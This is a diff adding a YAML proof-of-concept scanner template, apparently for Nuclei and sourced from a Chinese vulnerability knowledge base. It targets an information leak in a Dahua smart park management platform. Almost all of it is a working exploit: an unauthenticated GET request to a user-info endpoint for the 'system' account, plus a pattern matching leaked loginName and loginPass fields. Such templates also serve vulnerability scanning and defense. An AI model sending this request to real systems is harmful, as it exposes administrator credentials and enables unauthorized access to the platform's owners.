@@ -1,0 +1,40 @@
+id: poc-mlp34wbgbser13ty
+info:
+  name: 大华智慧园区综合管理平台敏感信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mlp34wbgbser13ty'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mlp34wbgbser13ty
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?loginName)(?=.*?loginPass).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
